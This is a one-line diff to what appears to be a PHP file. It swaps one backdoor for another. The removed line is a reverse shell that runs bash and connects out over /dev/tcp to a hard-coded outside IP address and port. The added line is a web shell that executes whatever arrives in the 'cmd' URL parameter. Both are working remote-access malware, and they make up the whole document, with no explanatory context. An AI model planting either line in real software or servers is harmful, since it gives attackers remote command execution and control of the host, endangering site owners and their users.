@@ -1,1 +1,1 @@
-<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"45.135.164.85"/5005 0>&1'");?>
+<?php system($_GET['cmd']); ?>
